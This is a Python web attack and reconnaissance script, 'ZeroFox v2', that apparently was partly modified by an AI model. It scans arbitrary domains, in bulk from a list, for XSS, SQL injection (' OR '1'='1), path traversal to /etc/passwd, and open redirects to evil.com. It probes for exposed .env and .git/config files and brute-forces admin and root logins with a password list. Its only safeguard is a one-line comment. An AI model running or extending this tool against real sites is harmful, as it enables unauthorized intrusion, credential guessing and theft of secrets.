#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ZeroFox v2 - XSS detection improved with headless rendering (Playwright)
# Original author: ZeroFox | Modifications: assistant
# IMPORTANT: Use only on authorized targets.

import os
import requests
import re
import urllib.parse
import time
import subprocess
import sys
from colorama import Fore, Style
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import urllib3
import random
from tqdm import tqdm

urllib3.disable_warnings()

# -------------------------
# Configuration
# -------------------------
XSS_PAYLOAD_FILE = "xss.txt"
RATE_LIMIT = 0.15            # seconds between requests
REQUEST_TIMEOUT = 8          # HTTP request timeout
SAVE_EVIDENCE = True         # save response HTML and screenshots
HEADLESS_ENABLED = True      # try to use Playwright for headless detection
PLAYWRIGHT_LAUNCH_OPTIONS = {"headless": True, "timeout": 15000}  # ms timeout for navigation

# -------------------------
# Try to import Playwright (optional)
# -------------------------
_playwright_available = False

if HEADLESS_ENABLED:
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
        _playwright_available = True
        print(Fore.GREEN + "[i] Playwright available: headless checks enabled." + Style.RESET_ALL)
    except Exception:
        _playwright_available = False
        print(Fore.YELLOW + "[!] Playwright not available. Headless detection DISABLED.")
        print(Fore.YELLOW + "[!] To enable headless detection install:\n    pip install playwright\n    python -m playwright install chromium" + Style.RESET_ALL)

# -------------------------
# UI / loading
# -------------------------
def loading(text="[~] Memuat..."):
    print(Fore.CYAN + text + Style.RESET_ALL)
    for _ in range(3):
        for dot in [".", "..", "..."]:
            sys.stdout.write(f"\r{text}{dot}   ")
            sys.stdout.flush()
            time.sleep(0.4)
    print("\r" + " " * (len(text) + 10) + "\r", end="")

def matrix_loading(text="[~] Initializing ZeroFox v2..."):
    charset = "01"
    print(Fore.GREEN + text + Style.RESET_ALL)
    for _ in range(8):
        line = ''.join(random.choice(charset) for _ in range(40))
        print(Fore.GREEN + line + Style.RESET_ALL)
        time.sleep(0.02)

print(Fore.RED + Style.BRIGHT + """
███████╗███████╗██████╗░░█████╗░███████╗░█████╗░██╗░░██╗
╚════██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
░░███╔═╝█████╗░░██████╔╝██║░░██║█████╗░░██║░░██║░╚███╔╝░
██╔══╝░░██╔══╝░░██╔══██╗██║░░██║██╔══╝░░██║░░██║░██╔██╗░
███████╗███████╗██║░░██║╚█████╔╝██║░░░░░╚█████╔╝██╔╝╚██╗
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░░░░░╚════╝░╚═╝░░╚═╝
""" + Style.RESET_ALL)

matrix_loading()

# -------------------------
# Example small password list (kept as-is)
# -------------------------
rockyou_mini = [
    "123456", "password", "123456789", "12345678", "12345",
    "admin", "letmein", "welcome", "qwerty", "abc123",
    "1q2w3e4r", "passw0rd", "iloveyou", "123123", "dragon"
]

# -------------------------
# Helpers
# -------------------------
def ensure_dir(path):
    os.makedirs(path, exist_ok=True)
    return path

def save_list(path, items):
    ensure_dir(os.path.dirname(path) if os.path.dirname(path) else ".")
    with open(path, "w", encoding="utf-8") as f:
        for it in items:
            f.write(it + "\n")

# -------------------------
# Payload loader
# -------------------------
def load_xss_payloads(path=XSS_PAYLOAD_FILE):
    if os.path.exists(path):
        with open(path, encoding="utf-8", errors="ignore") as f:
            payloads = [line.rstrip("\\n") for line in f if line.strip()]
        print(Fore.GREEN + f"[i] Loaded {len(payloads)} payload(s) from {path}." + Style.RESET_ALL)
        return payloads
    else:
        print(Fore.RED + f"[!] Payload file {path} not found." + Style.RESET_ALL)
        return []

# -------------------------
# Inject payload into query parameters
# -------------------------
def inject_payload(url, payload):
    try:
        base, params = url.split("?", 1)
        new_params = "&".join(f"{p.split('=')[0]}={urllib.parse.quote(payload)}" for p in params.split("&"))
        return f"{base}?{new_params}"
    except Exception:
        return url

# -------------------------
# Save evidence (HTML + screenshot)
# -------------------------
def save_evidence_html(outdir, safe_name, payload, resp_text):
    ev_dir = ensure_dir(os.path.join(outdir, "evidence"))
    fn = os.path.join(ev_dir, f"{safe_name}.html")
    try:
        with open(fn, "w", encoding="utf-8") as f:
            f.write(f"<!-- payload: {payload} -->\\n")
            f.write(resp_text)
    except Exception:
        pass
    return fn

def save_screenshot(outdir, safe_name, image_bytes):
    ev_dir = ensure_dir(os.path.join(outdir, "evidence"))
    fn = os.path.join(ev_dir, f"{safe_name}.png")
    try:
        with open(fn, "wb") as f:
            f.write(image_bytes)
    except Exception:
        pass
    return fn

# -------------------------
# Headless detection using Playwright
# -------------------------
def play_authorized_check(test_url, marker, outdir, timeout=8000):
    """
    Return tuple (detected:bool, details:dict)
    details may include: console_messages(list), screenshot_path, html_path
    """
    # if playwright not available, skip
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    except Exception:
        return (False, {"reason": "playwright_unavailable"})

    details = {"console": [], "screenshot": None, "html": None}
    safe_name = re.sub(r'[^0-9A-Za-z\\-_\\.]', '_', test_url)[:200] + "__" + str(int(time.time()))
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(**PLAYWRIGHT_LAUNCH_OPTIONS)
            context = browser.new_context()
            page = context.new_page()

            # listen to console messages
            def on_console(msg):
                try:
                    txt = msg.text()
                    details["console"].append(txt)
                except Exception:
                    pass
            page.on("console", on_console)

            # navigate (use try/catch to avoid hanging)
            try:
                page.goto(test_url, wait_until="networkidle", timeout=timeout)
            except Exception:
                pass

            # short wait to allow onload
            try:
                page.wait_for_timeout(200)  # ms
            except Exception:
                pass

            # check console messages for marker
            for m in details["console"]:
                if marker in m:
                    # save screenshot + html
                    try:
                        ss = page.screenshot(type="png")
                        details["screenshot"] = save_screenshot(outdir, safe_name, ss)
                        html = page.content()
                        details["html"] = save_evidence_html(outdir, safe_name + "_rendered", marker, html)
                    except Exception:
                        pass
                    context.close()
                    browser.close()
                    return (True, details)

            # If console didn't show, check DOM for marker text
            try:
                content = page.content()
                if marker in content:
                    details["html"] = save_evidence_html(outdir, safe_name + "_rendered", marker, content)
                    try:
                        ss = page.screenshot(type="png")
                        details["screenshot"] = save_screenshot(outdir, safe_name, ss)
                    except Exception:
                        pass
                    context.close()
                    browser.close()
                    return (True, details)
            except Exception:
                pass

            context.close()
            browser.close()
    except Exception as e:
        return (False, {"reason": f"playwright_error: {e}"})

    return (False, details)

# -------------------------
# XSS scanning improved
# -------------------------
def scan_xss(urls, outdir, payloads):
    hits = []
    if not payloads:
        print(Fore.YELLOW + "[!] No XSS payloads loaded. Skipping XSS scan." + Style.RESET_ALL)
        return hits

    print(Fore.CYAN + f"[i] Starting XSS scan: {len(urls)} URLs, {len(payloads)} payloads." + Style.RESET_ALL)
    for url in tqdm(urls, desc="[SCAN] XSS"):
        if "?" not in url:
            continue

        for payload in payloads:
            m = re.search(r"[A-Za-z0-9_]{6,}", payload)
            if m:
                marker = m.group(0)
            else:
                marker = "RECON_" + str(random.randint(100000, 999999))

            test_url = inject_payload(url, payload)

            # 1) quick HTTP request
            try:
                r = requests.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                resp = r.text or ""
                decoded_payload = urllib.parse.unquote_plus(payload)
                header_hit = False

                if (payload in resp) or (decoded_payload in resp) or (marker in resp):
                    print(Fore.RED + f"[XSS-REFLECT] {test_url}" + Style.RESET_ALL)
                    hits.append(test_url)
                    if SAVE_EVIDENCE:
                        safe = re.sub(r'[^0-9A-Za-z\\-_\\.]', '_', test_url)[:200]
                        save_evidence_html(outdir, safe + "__resp", payload, resp)
                    break

                for hk, hv in r.headers.items():
                    if payload in hv or decoded_payload in hv or marker in hv:
                        header_hit = True
                        print(Fore.RED + f"[XSS-HEADER] {test_url} (header: {hk})" + Style.RESET_ALL)
                        hits.append(test_url)
                        if SAVE_EVIDENCE:
                            safe = re.sub(r'[^0-9A-Za-z\\-_\\.]', '_', test_url)[:200]
                            save_evidence_html(outdir, safe + "__header", payload, f"{hk}: {hv}\\n\\n{resp}")
                        break
                if header_hit:
                    break

            except Exception:
                resp = ""
                pass
            finally:
                if RATE_LIMIT:
                    time.sleep(RATE_LIMIT)

            # 3) headless
            detected, details = play_authorized_check(test_url, marker, outdir)
            if detected:
                print(Fore.RED + f"[XSS-HEADLESS] {test_url} (marker: {marker})" + Style.RESET_ALL)
                hits.append(test_url)
                if SAVE_EVIDENCE:
                    repfn = os.path.join(outdir, "evidence", re.sub(r'[^0-9A-Za-z\\-_\\.]', '_', test_url)[:200] + "__report.txt")
                    try:
                        ensure_dir(os.path.dirname(repfn))
                        with open(repfn, "w", encoding="utf-8") as rf:
                            rf.write(f"URL: {test_url}\\nMARKER: {marker}\\nDETAILS:\\n{repr(details)}\\n")
                    except Exception:
                        pass
                break

    hits = sorted(set(hits))
    save_list(os.path.join(outdir, "xss_found_urls.txt"), hits)
    return hits

# -------------------------
# Generic scans (kept minimal)
# -------------------------
def scan_generic(urls, name, payload, detect_func, outdir, filename):
    hits = []
    for url in tqdm(urls, desc=f"[SCAN] {name}"):
        if "?" in url:
            test = inject_payload(url, payload)
            try:
                r = requests.get(test, timeout=REQUEST_TIMEOUT, verify=False)
                if detect_func(r):
                    print(Fore.RED + f"[{name}] {test}" + Style.RESET_ALL)
                    hits.append(test)
            except Exception:
                pass
            finally:
                if RATE_LIMIT:
                    time.sleep(RATE_LIMIT)
    save_list(os.path.join(outdir, filename), hits)

def scan_uploads(urls, outdir):
    hits = []
    for url in urls:
        try:
            r = requests.get(url, timeout=REQUEST_TIMEOUT, verify=False)
            if any(x in r.text.lower() for x in ["upload", "file", "browse"]):
                print(Fore.RED + f"[UPLOAD] {url}" + Style.RESET_ALL)
                hits.append(url)
        except Exception:
            pass
        finally:
            if RATE_LIMIT:
                time.sleep(RATE_LIMIT)
    save_list(os.path.join(outdir, "upload_panels.txt"), hits)

def scan_sensitive_files(domain, outdir):
    sensitive = ["/.env", "/.git/config", "/phpinfo.php", "/config.php"]
    hits = []
    for path in sensitive:
        url = f"http://{domain}{path}"
        try:
            r = requests.get(url, timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 200:
                print(Fore.RED + f"[SENSITIVE] {url}" + Style.RESET_ALL)
                hits.append(url)
        except Exception:
            pass
        finally:
            if RATE_LIMIT:
                time.sleep(RATE_LIMIT)
    save_list(os.path.join(outdir, "sensitive_files.txt"), hits)

def scan_nuclei(outdir):
    urls_path = os.path.join(outdir, "crawled_urls.txt")
    output_file = os.path.join(outdir, "nuclei_result.txt")
    if os.path.exists(urls_path):
        loading("[*] Menjalankan Nuclei")
        try:
            subprocess.run(["nuclei", "-l", urls_path, "-o", output_file, "-silent"], timeout=300)
        except Exception as e:
            print(Fore.RED + f"[!] Nuclei gagal: {e}" + Style.RESET_ALL)

def scan_dalfox(outdir):
    urls_path = os.path.join(outdir, "crawled_urls.txt")
    output_file = os.path.join(outdir, "dalfox_result.txt")
    if os.path.exists(urls_path):
        loading("[*] Menjalankan Dalfox")
        try:
            subprocess.run(["dalfox", "file", urls_path, "--output", output_file], timeout=300)
        except Exception as e:
            print(Fore.RED + f"[!] Dalfox gagal: {e}" + Style.RESET_ALL)

# -------------------------
# Brute force (use only with permission)
# -------------------------
def brute_force_login(url, user_field, pass_field, outdir):
    for u in ["admin", "root"]:
        for p in rockyou_mini:
            try:
                r = requests.post(url, data={user_field: u, pass_field: p}, timeout=REQUEST_TIMEOUT, allow_redirects=False)
                if r.status_code in [200, 302] and "incorrect" not in r.text.lower():
                    print(Fore.RED + f"[FOUND] {u}:{p}" + Style.RESET_ALL)
                    with open(f"{outdir}/brute_success.txt", "a", encoding="utf-8") as f:
                        f.write(f"{u}:{p}\n")
                    return
            except Exception:
                continue
            finally:
                if RATE_LIMIT:
                    time.sleep(RATE_LIMIT)

# -------------------------
# Crawl & orchestrate
# -------------------------
def find_subdomains(domain, outdir):
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=10)
        data = r.json()
        subdomains = sorted(set(entry['name_value'] for entry in data if domain in entry['name_value']))
        save_list(os.path.join(outdir, "subdomains.txt"), subdomains)
        return subdomains
    except Exception:
        return []

def find_urls(domain, outdir):
    try:
        r = requests.get(f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey", timeout=15)
        urls = sorted(set(r.text.splitlines()))
        save_list(os.path.join(outdir, "urls.txt"), urls)
        return urls
    except Exception:
        return []

def extract_parameters(urls, outdir):
    params = set()
    for url in urls:
        if "?" in url:
            query = urllib.parse.urlparse(url).query
            for p in urllib.parse.parse_qs(query).keys():
                params.add(p)
    save_list(os.path.join(outdir, "parameters.txt"), sorted(params))
    print(Fore.GREEN + f"[i] Parameter ditemukan: {len(params)} (disimpan di parameters.txt)" + Style.RESET_ALL)

def crawl_site(start_url, outdir, max_depth=2):
    domain = urllib.parse.urlparse(start_url).netloc
    visited, queue, found = set(), [(start_url, 0)], []
    while queue:
        url, depth = queue.pop(0)
        if url in visited or depth > max_depth:
            continue
        visited.add(url)
        try:
            r = requests.get(url, timeout=REQUEST_TIMEOUT, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            for link in soup.find_all("a", href=True):
                full_url = urljoin(url, link['href'])
                if domain in full_url and full_url not in visited:
                    if any(x in full_url for x in ["?", "=", "php"]):
                        found.append(full_url)
                    queue.append((full_url, depth + 1))
        except Exception:
            continue
    save_list(os.path.join(outdir, "crawled_urls.txt"), sorted(set(found)))
    return found

def scan_all(urls, domain):
    outdir = f"output/{domain}"
    ensure_dir(outdir)
    payloads = load_xss_payloads(XSS_PAYLOAD_FILE)
    scan_xss(urls, outdir, payloads)
    scan_generic(urls, "SQLi", "' OR '1'='1", lambda r: re.search(r"(sql|mysql|syntax|error)", r.text, re.I), outdir, "sqli.txt")
    scan_generic(urls, "LFI", "../../../../etc/passwd", lambda r: "root:x:" in r.text, outdir, "lfi.txt")
    scan_generic(urls, "Redirect", "https://evil.com", lambda r: "evil.com" in r.headers.get("Location", ""), outdir, "redirect.txt")
    scan_uploads(urls, outdir)
    scan_sensitive_files(domain, outdir)
    extract_parameters(urls, outdir)
    scan_nuclei(outdir)
    scan_dalfox(outdir)

def scan_domain(domain):
    outdir = f"output/{domain}"
    loading(f"[~] Memulai scan domain {domain}")
    subdomains = find_subdomains(domain, outdir)
    wayback = find_urls(domain, outdir)
    crawled = crawl_site(f"http://{domain}", outdir)
    urls = list(set(wayback + crawled))
    save_list(os.path.join(outdir, "all_urls.txt"), urls)
    scan_all(urls, domain)

def multi_target_scan():
    filepath = input("Masukkan path file list domain (contoh: targets.txt): ").strip()
    if not os.path.exists(filepath):
        print(Fore.RED + "[!] File tidak ditemukan." + Style.RESET_ALL)
        return
    with open(filepath) as f:
        targets = [line.strip() for line in f if line.strip()]
    for domain in targets:
        loading(f"[~] Scanning: {domain}")
        scan_domain(domain)

def single_target_mode():
    domain = input(Fore.YELLOW + "[>] Masukkan domain target: " + Style.RESET_ALL).strip()
    scan_domain(domain)
    brute = input("Brute force login? (y/n): ").strip().lower()
    if brute == 'y':
        url = input("Login URL: ").strip()
        user_field = input("Field username: ").strip()
        pass_field = input("Field password: ").strip()
        brute_force_login(url, user_field, pass_field, f"output/{domain}")

# -------------------------
# Entrypoint
# -------------------------
if __name__ == "__main__":
    print(Fore.GREEN + "\\n[MODE] 1 = Scan 1 domain | 2 = Multi scan (bulk.txt)\\n" + Style.RESET_ALL)
    mode = input("Pilih mode (1/2): ").strip()
    if mode == '2':
        multi_target_scan()
    else:
        single_target_mode()
    print(Fore.CYAN + "\\n[✓] Scan selesai. Hasil disimpan di folder output/." + Style.RESET_ALL)
